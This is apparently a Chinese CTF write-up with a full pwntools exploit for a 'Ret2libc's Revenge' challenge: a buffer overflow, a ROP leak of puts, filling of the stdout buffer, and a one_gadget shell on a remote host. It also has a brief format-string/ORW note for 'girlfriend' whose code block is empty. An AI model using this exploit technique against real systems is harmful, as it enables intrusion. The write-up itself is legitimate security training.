# Ret2libc's Revenge
ret2libc的题目，但开启了setvbuf(stdout, 0, 0, 0)导致需要将输出缓冲区填满才能有输出

Exp:

```Python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
ip, port = "8.147.132.32:18505".split(":")
elf_path = './ret2libc'
local = False
debug = False
debugger = '''
    b main
    b *0x401261
'''
if local:
    p = process(elf_path)
    if debug:
        gdb.attach(p, debugger)
else:
    p = remote(ip, port)

# p.sendline()
elf = ELF(elf_path)
libc = ELF('./libc.so.6')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
mov_rsi_rdi = 0x401180
add_rsi_qptr_rbp_20 = 0x4010e9
and_rsi = 0x4010e4
mov_eax_0_pop_rbp_ret = 0x4011f8
leave_ret = 0x401279
ret = 0x4010a0

# payload = b'a' * (0x218) + p64(0x1f00000218) + b'b' * (0x6)
# 由于他是先将gets到的数据存在heap里再一位一位读入栈中，在rbp前面是存放下标的位置需要注意不能乱覆盖，
# 需要控制使其继续向下覆盖
payload = p64(0x0).ljust(0x218, b'a') + b'\x18\x02\x00\x00\x1f\x00'
payload += p64(0x400600 - 0x20) # 0x400600存有puts函数的plt的地址，将其赋给rsi然后给rdi
payload += p64(and_rsi)
payload += p64(add_rsi_qptr_rbp_20)
payload += p64(mov_rsi_rdi)
payload += p64(puts_plt)
payload += p64(0x4011ff)
p.sendline(payload)

# 填充输出缓冲区，这里将rdi的值换为puts的实际地址可以一次性输出多一些
for i in range(150):
    payload = p64(0x0).ljust(0x218, b'a') + b'\x18\x02\x00\x00\x1f\x00'
    payload += p64(0x404018 - 0x20)
    payload += p64(and_rsi)
    payload += p64(add_rsi_qptr_rbp_20)
    payload += p64(mov_rsi_rdi)
    payload += p64(puts_plt)
    payload += p64(0x4011ff)
    p.sendline(payload)
    sleep(0.05)
    print(i)

p.recvuntil(b'Revenge\n')
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.info(f'puts_addr: {hex(puts_addr)}')
libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdi = libc_base + 0x2a3e5
gadget = [0xebd38, 0xebd3f, 0xebd43, 0xebc85, 0xebc88]
pop_r12 = libc_base + 0x35731

payload = p64(0x0).ljust(0x218, b'a') + b'\x18\x02\x00\x00\x1f\x00'
payload += p64(0x404999)
payload += p64(pop_r12) + p64(0)
payload += p64(libc_base + gadget[0])
# payload += p64(ret)
# payload += p64(pop_rdi)
# payload += p64(binsh_addr)
# payload += p64(system_addr)

# gdb.attach(p, 'b *0x401261')
p.sendline(payload)

p.interactive()
```

# girlfriend
综合类型的题目，可以用格式化字符串漏洞泄漏出栈地址，libc地址和code段基址。
题目没给libc版本，也没有好用的gadgets，本来以为要用非栈上格式化字符串漏洞去做，后来师傅说去靶机上找到libc版本是2.35，就可以构造ORW了。

```python

```

# EZ3.0
